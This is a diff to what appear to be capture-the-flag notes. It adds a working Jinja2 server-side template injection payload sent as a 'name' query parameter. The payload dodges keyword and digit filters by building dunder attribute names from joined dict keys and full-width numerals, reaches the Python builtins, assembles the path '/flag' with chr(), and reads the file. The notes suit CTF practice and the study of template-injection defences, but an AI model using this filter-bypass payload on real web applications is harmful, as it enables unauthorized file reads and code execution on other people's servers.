@@ -294,6 +294,17 @@ while 1:
         t += half2full(i)
     print(t)
 ```
+?name=
+{% set po=dict(po=a,p=a)|join%}
+{% set a=(()|select|string|list)|attr(po)(２４)%}
+{% set ini=(a,a,dict(init=a)|join,a,a)|join()%}
+{% set glo=(a,a,dict(globals=a)|join,a,a)|join()%}
+{% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%}
+{% set built=(a,a,dict(builtins=a)|join,a,a)|join()%}
+{% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%}
+{% set chr=x.chr%}
+{% set file=chr(４７)%2bchr(１０２)%2bchr(１０８)%2bchr(９７)%2bchr(１０３)%}
+{%print(x.open(file).read())%}
 ```
 {%set num=dict(aaaaaaaaaaaaaaaaaaaaaaaa=a)|join|count%}
 {%set numm=dict(aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=a)|join|count%}
